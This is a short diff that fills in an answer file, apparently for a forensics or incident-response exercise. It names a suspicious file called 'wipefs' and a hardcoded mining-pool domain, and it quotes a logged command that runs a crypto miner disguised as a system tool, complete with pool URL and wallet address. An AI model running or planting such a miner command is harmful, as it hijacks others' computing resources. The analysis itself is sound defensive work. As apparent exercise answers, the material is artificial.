@@ -1,8 +1,14 @@
 # provide the additional filename that you have identified as a potentially suspicious file. Also provide details about the Command and control Domain which is hardcoded inside this file. 
 
 # Filename
-
+wipefs
 
 # Callout domain
+stratum+tcp://mine.ppxxmr.com:7777
 
+Details:
+tmplog file contains this command being executed : CMD: /bin/wipefs -B -o stratum+tcp://mine.ppxxmr.com:7777 -u 43VZF7BUbP2CLYGC6CGo6iMSWtCHtkTmLF5Hy7Trkd59G1ZoSuKUjp5ij9942shw9X3Pdx36r2kMLaAuZT4BXp1DSjBrrJT -p 
+On researching about the domain we could identify it as a crypto miner. 
+Source of information: 
+https://exchange.xforce.ibmcloud.com/url/ppxvip1.ppxxmr.com 
  
